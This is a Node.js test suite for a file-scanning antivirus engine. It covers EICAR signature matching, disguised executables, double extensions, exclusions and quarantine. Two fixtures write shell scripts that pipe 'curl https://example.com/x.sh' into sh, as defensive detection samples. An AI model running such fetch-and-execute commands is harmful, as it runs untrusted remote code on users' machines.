"use strict";

const assert = require("node:assert/strict");
const fs = require("node:fs/promises");
const os = require("node:os");
const path = require("node:path");
const test = require("node:test");

const { scan, scanSingleFile } = require("../src/scanner/engine");
const { loadSignatures } = require("../src/scanner/signatures");
const { createQuarantine } = require("../src/scanner/quarantine");

const EICAR =
  "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";

const signatures = loadSignatures();

async function withTempDir(fn) {
  const dir = await fs.mkdtemp(path.join(os.tmpdir(), "campusshield-test-"));

  try {
    return await fn(dir);
  } finally {
    await fs.rm(dir, { recursive: true, force: true });
  }
}

test("flags the EICAR test file by signature", () =>
  withTempDir(async dir => {
    const file = path.join(dir, "eicar.com");
    await fs.writeFile(file, EICAR);

    const threat = await scanSingleFile(file, signatures);

    assert.ok(threat, "expected a threat");
    assert.equal(threat.severity, "critical");
    assert.ok(threat.reasons.some(reason => reason.id === "signature-match"));
  }));

test("flags a double extension", () =>
  withTempDir(async dir => {
    const file = path.join(dir, "invoice.pdf.exe");
    await fs.writeFile(file, "harmless text");

    const threat = await scanSingleFile(file, signatures);

    assert.ok(threat);
    assert.ok(threat.reasons.some(reason => reason.id === "double-extension"));
  }));

test("flags executable contents disguised as an image", () =>
  withTempDir(async dir => {
    const file = path.join(dir, "holiday.jpg");
    await fs.writeFile(file, Buffer.from("MZ\x90\x00binarypayload"));

    const threat = await scanSingleFile(file, signatures);

    assert.ok(threat);
    assert.ok(threat.reasons.some(reason => reason.id === "type-mismatch"));
  }));

test("flags script download-and-execute patterns", () =>
  withTempDir(async dir => {
    const file = path.join(dir, "install.sh");
    await fs.writeFile(file, "#!/bin/sh\ncurl -fsSL https://example.com/x.sh | sh\n");

    const threat = await scanSingleFile(file, signatures);

    assert.ok(threat);
    assert.ok(threat.reasons.some(reason => reason.id === "download-execute"));
    assert.equal(threat.severity, "high");
  }));

test("leaves a clean text file alone", () =>
  withTempDir(async dir => {
    const file = path.join(dir, "notes.txt");
    await fs.writeFile(file, "Remember to bring the lab report on Tuesday.");

    assert.equal(await scanSingleFile(file, signatures), null);
  }));

test("walking a directory only reports real findings", () =>
  withTempDir(async dir => {
    await fs.writeFile(path.join(dir, "clean.txt"), "nothing to see");
    await fs.writeFile(path.join(dir, "report.docx.exe"), "text");

    const result = await scan({
      scope: "quick",
      roots: [dir],
      signatures,
      limits: { maxFiles: 100, timeMs: 5000 },
      excludePaths: []
    });

    assert.equal(result.filesScanned, 2);
    assert.equal(result.threats.length, 1);
    assert.equal(result.threats[0].name, "report.docx.exe");
    assert.equal(result.threats[0].status, "detected");
  }));

test("skips excluded folders during a directory scan", () =>
  withTempDir(async dir => {
    const excluded = path.join(dir, "vendor");
    await fs.mkdir(excluded);
    await fs.writeFile(path.join(excluded, "install.sh"), "#!/bin/sh\ncurl https://example.com/x | sh\n");
    await fs.writeFile(path.join(dir, "clean.txt"), "nothing to see");

    const result = await scan({
      scope: "quick",
      roots: [dir],
      signatures,
      limits: { maxFiles: 100, timeMs: 5000 },
      excludePaths: [excluded]
    });

    assert.equal(result.filesScanned, 1);
    assert.equal(result.threats.length, 0);
  }));

test("quarantine moves a file aside and restores it", () =>
  withTempDir(async dataDir => {
    const sourceDir = path.join(dataDir, "src");
    await fs.mkdir(sourceDir, { recursive: true });

    const file = path.join(sourceDir, "sample.bin");
    await fs.writeFile(file, "payload");

    const vault = createQuarantine(dataDir);
    const stored = await vault.moveIn(file);

    assert.equal(await fs.stat(file).then(() => true, () => false), false);

    const restored = await vault.moveOut({
      storedName: stored.storedName,
      originalPath: file
    });

    assert.equal(restored, file);
    assert.equal(await fs.readFile(restored, "utf8"), "payload");
  }));
